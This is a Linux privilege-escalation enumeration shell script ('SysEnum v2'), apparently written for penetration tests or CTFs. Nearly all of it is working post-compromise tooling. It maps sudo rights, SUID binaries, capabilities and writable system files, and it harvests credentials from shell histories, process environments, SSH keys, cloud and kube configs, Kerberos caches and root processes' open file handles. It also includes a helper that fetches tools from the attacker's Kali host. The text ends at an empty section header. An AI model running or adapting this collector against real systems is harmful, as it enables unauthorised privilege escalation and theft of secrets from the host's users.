#!/bin/sh
# ╔══════════════════════════════════════════════════════════════════╗
# ║   SysEnum v2 collector — By @Mahdiesta · xl337x                  ║
# ║   Pure POSIX sh. Zero deps. Outputs one SYSENUM_DATA line.       ║
# ╚══════════════════════════════════════════════════════════════════╝

# ─── runtime tunables ─────────────────────────────────────────────────────
# Time budgets for heavy tool runs (the third-party enum scripts).
# These are intentionally generous — the user explicitly asked that
# each tool gets its full execution window. Override at invocation:
#   LSE_TIMEOUT=240 LINPEAS_TIMEOUT=300 sh sysenum_collect.sh
: "${SUID_FIND_TIMEOUT:=90}"
: "${WSH_FIND_TIMEOUT:=90}"
: "${CAPS_TIMEOUT:=60}"
: "${LSE_TIMEOUT:=180}"
: "${LINENUM_TIMEOUT:=180}"
: "${LINPEAS_TIMEOUT:=300}"
: "${INTERESTING_TIMEOUT:=60}"

# ─── helpers ──────────────────────────────────────────────────────────────
b64() {
    base64 2>/dev/null | tr -d '\n\r '
}
gzb64() {
    if command -v gzip >/dev/null 2>&1; then
        gzip -c 2>/dev/null | base64 2>/dev/null | tr -d '\n\r '
    else
        base64 2>/dev/null | tr -d '\n\r '
    fi
}
# Fallback no-op `timeout` for systems that don't have it
if ! command -v timeout >/dev/null 2>&1; then
    timeout() { shift; "$@"; }
fi

emit() { printf '%s=%s\n' "$1" "$2"; }

# ─── identify Kali (SSH_CLIENT trick) for auto-fetching enum tools ────────
KALI_IP=""
KALI_PORT="${SYSENUM_PORT:-}"
if [ -n "$SSH_CLIENT" ]; then
    KALI_IP=$(printf '%s' "$SSH_CLIENT" | awk '{print $1}')
fi
# Caller can set both, or just URL base, or skip entirely
KALI_BASE="${SYSENUM_BASE:-}"
if [ -z "$KALI_BASE" ] && [ -n "$KALI_IP" ] && [ -n "$KALI_PORT" ]; then
    KALI_BASE="http://$KALI_IP:$KALI_PORT"
fi

# ── tiny HTTP fetcher: curl > wget > /dev/tcp ────────────────────────────
fetch() {
    _url=$1
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --max-time 15 "$_url" 2>/dev/null
        return
    fi
    if command -v wget >/dev/null 2>&1; then
        wget -qO- --timeout=15 "$_url" 2>/dev/null
        return
    fi
    # /dev/tcp fallback (bash-only feature; sh may lack it)
    _host=$(printf '%s' "$_url" | awk -F/ '{print $3}' | awk -F: '{print $1}')
    _port=$(printf '%s' "$_url" | awk -F/ '{print $3}' | awk -F: '{print $2}')
    [ -z "$_port" ] && _port=80
    _path="/$(printf '%s' "$_url" | cut -d/ -f4-)"
    {
        printf 'GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n' "$_path" "$_host"
    } 2>/dev/null | (exec 3<>/dev/tcp/"$_host"/"$_port" 2>/dev/null && cat >&3 && sed -n '/^\r$/,$p' <&3 | tail -n +2) 2>/dev/null
}

# ─── identity (multi-fallback — never lose the username) ──────────────────
USER_UID=$(id -u 2>/dev/null || echo UNKNOWN)
USER_GID=$(id -g 2>/dev/null || echo UNKNOWN)
USER_NAME=$(id -un 2>/dev/null)
[ -z "$USER_NAME" ] && USER_NAME=$(whoami 2>/dev/null)
# Direct /etc/passwd lookup if NSS is broken / nameservice unreachable
if [ -z "$USER_NAME" ] || [ "$USER_NAME" = "nobody" ] || [ "$USER_NAME" = "?" ]; then
    if [ "$USER_UID" != "UNKNOWN" ] && [ -r /etc/passwd ]; then
        nm=$(awk -F: -v u="$USER_UID" '$3==u{print $1;exit}' /etc/passwd 2>/dev/null)
        [ -n "$nm" ] && USER_NAME="$nm"
    fi
fi
# env vars as last fallback
[ -z "$USER_NAME" ] && USER_NAME="${USER:-${LOGNAME:-UNKNOWN}}"
USER_GROUPS=$(id -Gn 2>/dev/null | tr ' ' ',')
[ -z "$USER_GROUPS" ] && USER_GROUPS=$(id -G 2>/dev/null | tr ' ' ',')
[ -z "$USER_GROUPS" ] && USER_GROUPS=UNKNOWN
HOST_NAME=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo UNKNOWN)

# ─── kernel / arch / distro ───────────────────────────────────────────────
KERNEL=$(uname -r 2>/dev/null)
ARCH=$(uname -m 2>/dev/null)
KERNEL_MAJOR=$(printf '%s' "$KERNEL" | cut -d. -f1)
KERNEL_MINOR=$(printf '%s' "$KERNEL" | cut -d. -f2)
KERNEL_PATCH=$(printf '%s' "$KERNEL" | cut -d. -f3 | cut -d- -f1 | tr -cd '0-9')

if [ -r /etc/os-release ]; then
    DISTRO=$(. /etc/os-release 2>/dev/null; printf '%s' "${PRETTY_NAME:-$NAME $VERSION}")
elif [ -r /etc/redhat-release ]; then
    DISTRO=$(cat /etc/redhat-release 2>/dev/null)
elif [ -r /etc/debian_version ]; then
    DISTRO="Debian $(cat /etc/debian_version 2>/dev/null)"
else
    DISTRO="UNKNOWN"
fi

# ─── container detection ──────────────────────────────────────────────────
CONTAINER=NO
[ -f /.dockerenv ] && CONTAINER=docker
[ -f /run/.containerenv ] && CONTAINER=podman
if [ "$CONTAINER" = "NO" ] && [ -r /proc/1/cgroup ]; then
    if grep -qE 'docker|kubepods|containerd|lxc' /proc/1/cgroup 2>/dev/null; then
        CONTAINER=cgroup
    fi
fi

# ─── SELinux / noexec ─────────────────────────────────────────────────────
if command -v getenforce >/dev/null 2>&1; then
    SELINUX_STATUS=$(getenforce 2>/dev/null | tr '[:upper:]' '[:lower:]')
elif [ -r /etc/selinux/config ]; then
    SELINUX_STATUS=$(grep "^SELINUX=" /etc/selinux/config 2>/dev/null | cut -d= -f2)
else
    SELINUX_STATUS=absent
fi
[ -z "$SELINUX_STATUS" ] && SELINUX_STATUS=absent
NOEXEC_TMP=NO
mount 2>/dev/null | grep -E ' /tmp ' | grep -q noexec && NOEXEC_TMP=YES

# ─── sudo collection (NEVER give up — try every angle) ───────────────────
# Stage 1: sudo -n -l (no-password query)
SUDO_NOPASS=$(timeout 5 sudo -n -l 2>/dev/null)
# Stage 2: sudo -l (may need TTY/password — usually fails silently when piped)
SUDO_INTERACTIVE=$(timeout 5 sudo -l 2>/dev/null)
# Stage 3: read /etc/sudoers and /etc/sudoers.d/* directly (often readable!)
SUDOERS_DIRECT=""
for f in /etc/sudoers /etc/sudoers.d/* /etc/sudoers.d/.*; do
    [ -f "$f" ] && [ -r "$f" ] || continue
    SUDOERS_DIRECT="$SUDOERS_DIRECT
### $f ###
$(cat "$f" 2>/dev/null)"
done
# Stage 4: any rules that mention current user / current group(s) — extract for the operator
SUDOERS_MATCHING_USER=""
if [ -n "$SUDOERS_DIRECT" ]; then
    # match lines starting with: USER, %GROUP, +netgroup, User_Alias references
    grp_pattern=$(printf '%s' "$USER_GROUPS" | tr ',' '|')
    [ -z "$grp_pattern" ] && grp_pattern='__NONE__'
    SUDOERS_MATCHING_USER=$(printf '%s' "$SUDOERS_DIRECT" | \
        grep -E "^[[:space:]]*${USER_NAME}[[:space:]]|^[[:space:]]*%(${grp_pattern})[[:space:]]|NOPASSWD" 2>/dev/null)
fi

# Decide overall status — explicit state machine
if [ -n "$SUDO_NOPASS" ] && ! echo "$SUDO_NOPASS" | grep -qi "password is required"; then
    SUDO_RAW="$SUDO_NOPASS"
    SUDO_NEEDS_PASS=NO
    SUDO_STATUS=NOPASS_OK
elif [ -n "$SUDO_INTERACTIVE" ]; then
    SUDO_RAW="$SUDO_INTERACTIVE"
    SUDO_NEEDS_PASS=YES
    SUDO_STATUS=REQUIRES_PASS
elif [ -n "$SUDOERS_MATCHING_USER" ]; then
    # We couldn't run sudo but we CAN read sudoers → synthesize SUDO_RAW from the file
    SUDO_RAW="$SUDOERS_MATCHING_USER"
    SUDO_NEEDS_PASS=UNKNOWN
    SUDO_STATUS=READ_FROM_FILE
elif ! command -v sudo >/dev/null 2>&1; then
    SUDO_RAW=""
    SUDO_NEEDS_PASS=NO_SUDO_BIN
    SUDO_STATUS=NO_SUDO_BIN
else
    SUDO_RAW=""
    SUDO_NEEDS_PASS=LOCKED
    SUDO_STATUS=LOCKED
fi
SUDO_VERSION=$(sudo -V 2>/dev/null | head -1)
[ -z "$SUDO_VERSION" ] && SUDO_VERSION=$(sudo --version 2>/dev/null | head -1)

# Extract sudo binary dirs — now from SUDO_RAW *or* directly from /etc/sudoers
SUDO_SCAN_SRC="$SUDO_RAW
$SUDOERS_DIRECT"
SUDO_BINARY_DIRS=$(
    printf '%s' "$SUDO_SCAN_SRC" | grep -oE '/[A-Za-z0-9_./-]+' | \
        awk -F/ 'BEGIN{OFS="/"} {NF--; print}' | \
        awk 'NF && /^\//' | sort -u
)
SUDO_NOPASS_PATHS=$(
    printf '%s' "$SUDO_SCAN_SRC" | grep -i NOPASSWD | \
        grep -oE '/[A-Za-z0-9_./*-]+' | sort -u
)

# ─── SUID / SGID with full ownership ──────────────────────────────────────
# We capture: path:owner:group:permstring using ls -la (portable; stat -c differs on BSD)
SUID_PATHS=$(timeout "$SUID_FIND_TIMEOUT" find / -xdev -perm -4000 -type f 2>/dev/null | sort -u)
# Format: path:owner_name:owner_uid:group_name:group_gid:perms
# We capture BOTH name and numeric uid/gid so the operator can verify even when
# NSS lookups return 'nobody' for unknown UIDs.
SUID_FULL=$(
    printf '%s\n' "$SUID_PATHS" | while IFS= read -r p; do
        [ -z "$p" ] && continue
        m_name=$(ls -ld  "$p" 2>/dev/null)
        m_num=$(ls -ldn  "$p" 2>/dev/null)
        perms=$(printf '%s' "$m_name" | awk '{print $1}')
        oname=$(printf '%s' "$m_name" | awk '{print $3}')
        gname=$(printf '%s' "$m_name" | awk '{print $4}')
        ouid=$(printf  '%s' "$m_num"  | awk '{print $3}')
        ogid=$(printf  '%s' "$m_num"  | awk '{print $4}')
        # If name lookup returned 'nobody' but numeric is different, fall back to /etc/passwd
        if [ "$oname" = "nobody" ] && [ -r /etc/passwd ]; then
            real=$(awk -F: -v u="$ouid" '$3==u{print $1;exit}' /etc/passwd 2>/dev/null)
            [ -n "$real" ] && oname="$real"
        fi
        printf '%s:%s:%s:%s:%s:%s\n' "$p" "$oname" "$ouid" "$gname" "$ogid" "$perms"
    done
)
SGID_PATHS=$(timeout "$SUID_FIND_TIMEOUT" find / -xdev -perm -2000 -type f 2>/dev/null | sort -u)
SGID_FULL=$(
    printf '%s\n' "$SGID_PATHS" | while IFS= read -r p; do
        [ -z "$p" ] && continue
        m_name=$(ls -ld  "$p" 2>/dev/null)
        m_num=$(ls -ldn  "$p" 2>/dev/null)
        perms=$(printf '%s' "$m_name" | awk '{print $1}')
        oname=$(printf '%s' "$m_name" | awk '{print $3}')
        gname=$(printf '%s' "$m_name" | awk '{print $4}')
        ouid=$(printf  '%s' "$m_num"  | awk '{print $3}')
        ogid=$(printf  '%s' "$m_num"  | awk '{print $4}')
        printf '%s:%s:%s:%s:%s:%s\n' "$p" "$oname" "$ouid" "$gname" "$ogid" "$perms"
    done
)

# Writable SUID — tag owner by both NAME and UID (so the operator can compare reliably)
WRITABLE_SUID=$(
    printf '%s\n' "$SUID_FULL" | while IFS= read -r line; do
        [ -z "$line" ] && continue
        path=$(printf '%s' "$line" | cut -d: -f1)
        oname=$(printf '%s' "$line" | cut -d: -f2)
        ouid=$(printf '%s' "$line" | cut -d: -f3)
        if [ -w "$path" ]; then
            tag=OTHER_OWNED
            [ "$ouid" = "0" ] && tag=ROOT_OWNED
            [ "$ouid" = "$USER_UID" ] && tag=SELF_OWNED
            printf '%s:%s:%s:%s\n' "$path" "$oname" "$ouid" "$tag"
        fi
    done
)

# ─── capabilities ─────────────────────────────────────────────────────────
GETCAP_BIN=$(command -v getcap 2>/dev/null)
if [ -z "$GETCAP_BIN" ]; then
    for c in /sbin/getcap /usr/sbin/getcap /usr/local/sbin/getcap /usr/bin/getcap; do
        [ -x "$c" ] && GETCAP_BIN="$c" && break
    done
fi
if [ -n "$GETCAP_BIN" ]; then
    CAPS_LIST=$(timeout "$CAPS_TIMEOUT" "$GETCAP_BIN" -r / 2>/dev/null | tr -d '\0')
    [ -z "$CAPS_LIST" ] && CAPS_LIST="GETCAP_NO_RESULTS"
else
    CAPS_LIST="GETCAP_ABSENT"
fi

# ─── sensitive files ──────────────────────────────────────────────────────
PASSWD_WRITABLE=NO;  [ -w /etc/passwd ]  && PASSWD_WRITABLE=YES
SHADOW_READABLE=NO;  [ -r /etc/shadow ]  && SHADOW_READABLE=YES
SHADOW_WRITABLE=NO;  [ -w /etc/shadow ]  && SHADOW_WRITABLE=YES
SUDOERS_WRITABLE=NO; [ -w /etc/sudoers ] && SUDOERS_WRITABLE=YES
CRONTAB_WRITABLE=NO; [ -w /etc/crontab ] && CRONTAB_WRITABLE=YES
HOSTS_WRITABLE=NO;   [ -w /etc/hosts ]   && HOSTS_WRITABLE=YES

WRITABLE_SENSITIVE=""
for f in /etc/passwd /etc/shadow /etc/sudoers /etc/group \
         /etc/crontab /etc/iptables/rules.v4 /etc/hosts; do
    [ -w "$f" ] && WRITABLE_SENSITIVE="$WRITABLE_SENSITIVE $f"
done

# ─── processes ────────────────────────────────────────────────────────────
RUNNING_PROCS=$(ps aux 2>/dev/null || ps -ef 2>/dev/null)
ROOT_PROCS=$(printf '%s' "$RUNNING_PROCS" | awk 'NR>1 && $1=="root" && $11!~/^\[/')
PROC_BINS=$(printf '%s' "$RUNNING_PROCS" | awk 'NR>1{print $11}' | sort -u)

# Writable running binaries — compound vector
WRITABLE_RUNNING=$(
    printf '%s\n' "$PROC_BINS" | while IFS= read -r p; do
        case "$p" in
            /*) [ -f "$p" ] && [ -w "$p" ] && \
                  printf '%s\n' "$p" ;;
        esac
    done | sort -u
)

# ─── cron (everywhere) ────────────────────────────────────────────────────
CRON_ALL=""
for f in /etc/crontab /etc/anacrontab; do
    [ -r "$f" ] && CRON_ALL="$CRON_ALL
### $f ###
$(cat "$f" 2>/dev/null)"
done
for d in /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly \
         /var/spool/cron /var/spool/cron/crontabs; do
    [ -d "$d" ] || continue
    for f in "$d"/*; do
        [ -f "$f" ] && [ -r "$f" ] && CRON_ALL="$CRON_ALL
### $f ###
$(cat "$f" 2>/dev/null)"
    done
done
CRON_USER=$(crontab -l 2>/dev/null)
[ -n "$CRON_USER" ] && CRON_ALL="$CRON_ALL
### crontab -l (user $USER_NAME) ###
$CRON_USER"

CRON_SCRIPT_PATHS=$(printf '%s' "$CRON_ALL" | \
    grep -oE '/[a-zA-Z0-9/_.-]+\.(sh|py|pl|rb|php)' | sort -u)
WRITABLE_CRON_SCRIPTS=$(
    printf '%s\n' "$CRON_SCRIPT_PATHS" | while IFS= read -r p; do
        [ -n "$p" ] && [ -w "$p" ] && printf '%s\n' "$p"
    done
)

# ─── all writable .sh files (compound-callee source) ──────────────────────
WRITABLE_SH=$(timeout "$WSH_FIND_TIMEOUT" find / -xdev -writable -name "*.sh" -type f 2>/dev/null | \
    grep -vE '^/(proc|sys|dev|run|snap)/' | sort -u)

# Per-sudo-dir writable scripts (the headline compound check)
SUDO_DIR_WRITABLE_SH=""
if [ -n "$SUDO_BINARY_DIRS" ] && [ -n "$WRITABLE_SH" ]; then
    SUDO_DIR_WRITABLE_SH=$(
        printf '%s\n' "$SUDO_BINARY_DIRS" | while IFS= read -r dir; do
            [ -z "$dir" ] && continue
            printf '%s\n' "$WRITABLE_SH" | awk -v d="$dir" 'index($0, d)==1 {print d"|"$0}'
        done
    )
fi

# ─── PATH writability ─────────────────────────────────────────────────────
PATH_DIRS=""
PATH_HIJACK_RISK=NO
seen_priv=0
old_ifs=$IFS
IFS=:
for d in $PATH; do
    [ -d "$d" ] || continue
    w=NO; [ -w "$d" ] && w=YES
    case "$d" in
        /usr/bin|/usr/sbin|/bin|/sbin) seen_priv=1 ;;
    esac
    if [ "$w" = "YES" ] && [ "$seen_priv" -eq 0 ]; then
        PATH_HIJACK_RISK=YES
    fi
    PATH_DIRS="${PATH_DIRS}${d}=${w}
"
done
IFS=$old_ifs

# ─── NFS / docker / lxd / disk / etc ─────────────────────────────────────
NFS_EXPORTS=""
[ -r /etc/exports ] && NFS_EXPORTS=$(cat /etc/exports 2>/dev/null)

if [ -S /var/run/docker.sock ]; then
    DOCKER_SOCKET=PRESENT
    if [ -w /var/run/docker.sock ]; then
        DOCKER_SOCKET_WRITABLE=YES
    else
        DOCKER_SOCKET_WRITABLE=NO
    fi
else
    DOCKER_SOCKET=ABSENT
    DOCKER_SOCKET_WRITABLE=ABSENT
fi
DOCKER_BIN=$(command -v docker 2>/dev/null || echo ABSENT)

DOCKER_GROUP_MEMBERS=$(grep "^docker:" /etc/group 2>/dev/null | cut -d: -f4)
LXD_GROUP_MEMBERS=$(grep -E "^lxd:|^lxc:" /etc/group 2>/dev/null | cut -d: -f4)
DISK_GROUP_MEMBERS=$(grep "^disk:" /etc/group 2>/dev/null | cut -d: -f4)
ADM_GROUP_MEMBERS=$(grep "^adm:" /etc/group 2>/dev/null | cut -d: -f4)
WHEEL_GROUP_MEMBERS=$(grep "^wheel:" /etc/group 2>/dev/null | cut -d: -f4)
SUDO_GROUP_MEMBERS=$(grep "^sudo:" /etc/group 2>/dev/null | cut -d: -f4)

ALL_USER_GROUPS=$(awk -F: '
{
    gsub(/,/, " ", $4)
    n = split($4, members, " ")
    for (i=1;i<=n;i++) {
        if (members[i] != "")
            map[members[i]] = map[members[i]] "," $1
    }
}
END {
    for (u in map) {
        g = map[u]; sub(/^,/, "", g)
        print u "=" g
    }
}' /etc/group 2>/dev/null | sort)

# ─── SSH keys (with metadata) ─────────────────────────────────────────────
SSH_KEYS=$(find /home /root /etc/ssh /tmp /opt /var \
    \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \
       -o -name "id_dsa" -o -name "*.pem" -o -name "*.key" \
       -o -name "authorized_keys" \) 2>/dev/null | while IFS= read -r k; do
        [ -r "$k" ] || { printf '%s :: UNREADABLE\n' "$k"; continue; }
        first=$(head -1 "$k" 2>/dev/null)
        case "$first" in
            *PRIVATE*)
                enc=NO
                head -3 "$k" 2>/dev/null | grep -qi 'ENCRYPTED\|DEK-Info' && enc=YES
                meta=$(ls -ld "$k" 2>/dev/null)
                printf '%s :: encrypted=%s :: %s\n' "$meta" "$enc" "$k" ;;
            ssh-*|ecdsa-sha2-*)
                meta=$(ls -ld "$k" 2>/dev/null)
                printf '%s :: PUBKEY :: %s\n' "$meta" "$k" ;;
            *)
                meta=$(ls -ld "$k" 2>/dev/null)
                printf '%s :: %s\n' "$meta" "$k" ;;
        esac
    done)

# ─── bash history filtered ────────────────────────────────────────────────
BASH_HISTORY=$(find /home /root -maxdepth 3 -name ".*history" 2>/dev/null | \
    while IFS= read -r h; do [ -r "$h" ] && cat "$h" 2>/dev/null; done | \
    grep -iE "mysql|psql|ssh |ftp |curl.*-u|wget.*--user|su |sudo |pass|token|secret|api[_-]?key|-p[A-Za-z0-9]" | \
    head -80)

# ─── interesting files ────────────────────────────────────────────────────
INTERESTING_FILES=$(timeout "$INTERESTING_TIMEOUT" find / -xdev 2>/dev/null \
    \( -name "wp-config.php" -o -name ".env" -o -name "config.php" \
       -o -name "*.bak" -o -name "*.old" -o -name "database.yml" \
       -o -name "credentials*" -o -name ".aws" -o -name ".git-credentials" \
       -o -name "settings.py" -o -name "secrets.yml" -o -name ".netrc" \
       -o -name "*.my.cnf" -o -name ".my.cnf" -o -name ".pgpass" \
       -o -name "id_rsa*" -o -name "*.kdbx" \) | \
    grep -vE "/(proc|sys|lib/python|node_modules|var/cache|.git)/" | head -40)

# ─── MOTD ─────────────────────────────────────────────────────────────────
MOTD_WRITABLE=""
[ -d /etc/update-motd.d ] && MOTD_WRITABLE=$(find /etc/update-motd.d -writable -type f 2>/dev/null)
for f in /etc/motd /etc/issue /etc/issue.net /etc/profile.d/*.sh; do
    [ -w "$f" ] && MOTD_WRITABLE="$MOTD_WRITABLE
$f"
done
MOTD_WRITABLE=$(printf '%s' "$MOTD_WRITABLE" | sed '/^$/d')

# ─── systemd timers + writable units ──────────────────────────────────────
if command -v systemctl >/dev/null 2>&1; then
    TIMERS=$(timeout 10 systemctl list-timers --all --no-pager 2>/dev/null)
else
    TIMERS="SYSTEMD_ABSENT"
fi
WRITABLE_SYSTEMD=$(find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system \
    -writable -type f 2>/dev/null | head -20)

# ─── /proc/*/environ for creds ────────────────────────────────────────────
PROC_CREDS=""
if [ -d /proc ]; then
    PROC_CREDS=$(
        for envf in /proc/*/environ; do
            if [ -r "$envf" ]; then
                data=$( { tr '\0' '\n' < "$envf"; } 2>/dev/null | \
                       grep -iE "pass|secret|token|key|cred" 2>/dev/null )
                [ -n "$data" ] && printf '=== %s ===\n%s\n' "$envf" "$data"
            fi
        done 2>/dev/null
    )
fi

# ─── instant-win library hijack files ────────────────────────────────────
LD_PRELOAD_WRITABLE=NO; [ -w /etc/ld.so.preload ] && LD_PRELOAD_WRITABLE=YES
LD_PRELOAD_EXISTS=NO;   [ -f /etc/ld.so.preload ] && LD_PRELOAD_EXISTS=YES
LD_SO_CONFD_WRITABLE=$(find /etc/ld.so.conf.d /etc/ld.so.conf -writable 2>/dev/null)

# ─── individual sudoers.d entries writable ────────────────────────────────
SUDOERSD_WRITABLE=$(find /etc/sudoers.d -writable -type f 2>/dev/null)

# ─── sudo token reuse (cached credentials) ────────────────────────────────
# sudo -v -n returns 0 with no prompt if a valid timestamp exists for this user
SUDO_TOKEN_VALID=NO
if timeout 3 sudo -v -n 2>/dev/null; then
    # double-check sudo -n -l actually returns something (not just exit-code 0 oddity)
    if timeout 3 sudo -n -l 2>/dev/null | grep -q . ; then
        SUDO_TOKEN_VALID=YES
    fi
fi

# ─── sshd_config + AuthorizedKeysCommand ─────────────────────────────────
SSHD_CONFIG_WRITABLE=NO
[ -w /etc/ssh/sshd_config ] && SSHD_CONFIG_WRITABLE=YES
SSHD_AUTHKEY_CMD=""
if [ -r /etc/ssh/sshd_config ]; then
    akc=$(grep -E '^[[:space:]]*AuthorizedKeysCommand[[:space:]]' /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' | head -1)
    if [ -n "$akc" ]; then
        w=NO; [ -w "$akc" ] && w=YES
        SSHD_AUTHKEY_CMD="$akc:writable=$w"
    fi
fi

# ─── SSH agent sockets from OTHER users (lateral) ────────────────────────
SSH_AGENT_SOCKS=$(
    for s in /tmp/ssh-*/agent.* /tmp/agent.* /run/user/*/ssh-agent.socket; do
        [ -S "$s" ] || continue
        meta=$(ls -ld "$s" 2>/dev/null)
        owner=$(printf '%s' "$meta" | awk '{print $3}')
        w=NO; [ -w "$s" ] && w=YES
        # accessible if writable OR if dir is traversable
        [ "$owner" != "$USER_NAME" ] && printf '%s :: owner=%s writable=%s\n' "$s" "$owner" "$w"
    done 2>/dev/null
)

# ─── polkit / PAM / NSS module writability (root-on-next-event) ──────────
POLKIT_WRITABLE=$(find /etc/polkit-1 /usr/share/polkit-1/rules.d -writable 2>/dev/null | head -10)
PAM_WRITABLE=$(find /etc/pam.d /lib/security /lib/x86_64-linux-gnu/security /lib64/security /usr/lib/x86_64-linux-gnu/security -writable 2>/dev/null | head -10)
NSS_WRITABLE=$(find /lib /lib64 /usr/lib /usr/lib64 -maxdepth 3 -name 'libnss_*.so*' -writable 2>/dev/null)

# ─── listening services (archetype detection) ─────────────────────────────
LISTENING=""
if command -v ss >/dev/null 2>&1; then
    LISTENING=$(timeout 10 ss -tlnpu 2>/dev/null)
elif command -v netstat >/dev/null 2>&1; then
    LISTENING=$(timeout 10 netstat -tlnpu 2>/dev/null)
fi

# ─── recently modified files (CTF gold — under 60min / 24h) ──────────────
RECENT_60MIN=$(timeout 30 find / -xdev -mmin -60 -type f 2>/dev/null | \
    grep -vE '^/(proc|sys|run|var/log|var/lib/dpkg|var/cache|tmp/sysenum|var/spool/postfix|home/[^/]+/\.(cache|mozilla|config))' | head -40)
RECENT_24H=$(timeout 30 find / -xdev -mtime -1 -type f 2>/dev/null | \
    grep -vE '^/(proc|sys|run|var/log|var/lib/dpkg|var/cache|tmp/sysenum|var/spool/postfix|home/[^/]+/\.(cache|mozilla|config))' | head -60)

# ─── /etc/profile.d, /etc/bash.bashrc, /etc/skel writable ────────────────
PROFILE_WRITABLE=""
for f in /etc/profile /etc/bash.bashrc /etc/bashrc /etc/zsh/zshrc /etc/zsh/zprofile; do
    [ -w "$f" ] && PROFILE_WRITABLE="$PROFILE_WRITABLE
$f"
done
if [ -d /etc/profile.d ]; then
    PROFILE_WRITABLE="$PROFILE_WRITABLE
$(find /etc/profile.d -writable -type f 2>/dev/null)"
fi
SKEL_WRITABLE=$(find /etc/skel -writable -type f 2>/dev/null)
PROFILE_WRITABLE=$(printf '%s' "$PROFILE_WRITABLE" | sed '/^$/d')

# ─── OTHER users' rc/profile files writable to us (login-trigger root) ──
OTHER_USER_RC=$(
    for h in /home/*/.bashrc /home/*/.profile /home/*/.bash_profile /home/*/.zshrc /root/.bashrc /root/.profile; do
        [ -f "$h" ] || continue
        owner=$(ls -ld "$h" 2>/dev/null | awk '{print $3}')
        [ "$owner" = "$USER_NAME" ] && continue
        if [ -w "$h" ]; then
            printf '%s :: owner=%s :: WRITABLE\n' "$h" "$owner"
        fi
    done
)

# ─── /etc/logrotate.d/, postrotate scripts ────────────────────────────────
LOGROTATE_WRITABLE=$(find /etc/logrotate.d /etc/logrotate.conf -writable 2>/dev/null)

# ─── Python site-packages writability (root-script import hijack) ────────
PYSITE_WRITABLE=$(
    for d in /usr/lib/python3/dist-packages /usr/lib/python2.7/dist-packages \
             /usr/local/lib/python*/dist-packages /usr/local/lib/python*/site-packages \
             /usr/lib/python3*/site-packages; do
        [ -d "$d" ] || continue
        w=NO; [ -w "$d" ] && w=YES
        [ "$w" = "YES" ] && printf '%s :: WRITABLE\n' "$d"
    done
)

# ─── /etc/security/limits.d etc ──────────────────────────────────────────
SECURITY_WRITABLE=$(find /etc/security -writable 2>/dev/null)

# ─── loaded kernel modules ────────────────────────────────────────────────
LSMOD=$(lsmod 2>/dev/null | head -60)

# ─── mounts (find bind/overlay/nfs from inside) ──────────────────────────
MOUNTS=$(mount 2>/dev/null)
NFS_MOUNTED=$(printf '%s' "$MOUNTS" | grep -E 'type nfs| nfs ' | head -20)
OVERLAY_MOUNTS=$(printf '%s' "$MOUNTS" | grep -E 'type overlay|overlay on' | head -10)

# ─── cron PATH override scan ──────────────────────────────────────────────
CRON_PATH_OVERRIDE=$(printf '%s' "$CRON_ALL" | grep -E '^PATH=' | sort -u)

# ─── credential files in user home dirs ───────────────────────────────────
CRED_FILES=$(
    for d in /root /home/* /var/lib/*/; do
        [ -d "$d" ] || continue
        for spec in .aws/credentials .aws/config .kube/config .docker/config.json \
                    .netrc .npmrc .pypirc .gem/credentials .git-credentials \
                    .config/gcloud/credentials.db .azure/azureProfile.json \
                    .ssh/known_hosts .gnupg/pubring.kbx; do
            f="$d/$spec"
            [ -f "$f" ] || continue
            r=NO; [ -r "$f" ] && r=YES
            meta=$(ls -ld "$f" 2>/dev/null | awk '{print $3":"$4}')
            printf '%s :: owner=%s :: readable=%s\n' "$f" "$meta" "$r"
        done
    done
)
# NetworkManager WiFi PSKs
NM_PSK=$(find /etc/NetworkManager/system-connections -readable 2>/dev/null | head -10)

# ─── kerberos cred caches ─────────────────────────────────────────────────
KRB_TICKETS=$(ls -la /tmp/krb5cc_* /var/run/user/*/krb5cc* 2>/dev/null | head -10)

# ─── mailspool readability ────────────────────────────────────────────────
MAILSPOOL=$(ls -la /var/mail/* /var/spool/mail/* 2>/dev/null | head -20)

# ─── screen / tmux sessions of other users ────────────────────────────────
SCREEN_TMUX=$(
    for d in /var/run/screen /tmp/screen-* /tmp/tmux-*; do
        [ -d "$d" ] && find "$d" -type s 2>/dev/null
    done | head -10
)

# ─── strings analysis of custom (non-GTFOBins, non-stdlib) SUID binaries ─
CUSTOM_SUID_STRINGS=""
if command -v strings >/dev/null 2>&1; then
    CUSTOM_SUID_STRINGS=$(
        printf '%s\n' "$SUID_PATHS" | while IFS= read -r p; do
            [ -z "$p" ] && continue
            bn=$(basename "$p")
            # Skip well-known stdlib SUIDs
            case "$bn" in
                su|sudo|mount|umount|passwd|chsh|chfn|gpasswd|newgrp|pkexec|fusermount|fusermount3|ping|chage|crontab|wall|write|expiry|pwdb_chkpwd|unix_chkpwd|at|ssh-keysign|ssh-agent|polkit-agent-helper-1|dbus-daemon-launch-helper|chrome-sandbox|Xorg.wrap|run-mailcap|kismet_cap_*|vmware-vmx-stats|vmware-vmx) continue ;;
                bash|sh|dash|find|vim|vi|nano|less|more|awk|python*|perl|ruby|php|node|nodejs|env|cp|mv|tar|cat|cut|head|tail|grep|sed|tee|dd|xxd|base64|cmp|file|strings|wc) continue ;;
            esac
            # custom binary — dump interesting strings
            out=$(timeout 5 strings "$p" 2>/dev/null | tr -d '\0' | \
                  grep -E '^/[a-zA-Z0-9._/-]+$|getenv|setuid|system\(|execv|execl|popen|/bin/|fopen' | \
                  head -25)
            [ -n "$out" ] && printf '=== %s ===\n%s\n' "$p" "$out"
        done
    )
fi

# ─── readable /proc/*/fd of root processes (open file leaks) ─────────────
ROOT_FD_LEAKS=$(
    for pid in $(ps -eo pid,user 2>/dev/null | awk '$2=="root"{print $1}'); do
        fddir="/proc/$pid/fd"
        [ -r "$fddir" ] || continue
        for fd in "$fddir"/*; do
            [ -L "$fd" ] || continue
            target=$(readlink "$fd" 2>/dev/null)
            case "$target" in
                /etc/shadow|/etc/sudoers|/root/*|/var/log/auth*|*credential*|*secret*|*token*|*.pem|*.key|*id_rsa*)
                    printf 'pid=%s fd=%s -> %s\n' "$pid" "$(basename "$fd")" "$target"
                    ;;
            esac
        done
    done | head -20
)

# ─── extended interesting backups (.sql .dump .tar.gz in /var, /opt, /srv) ─
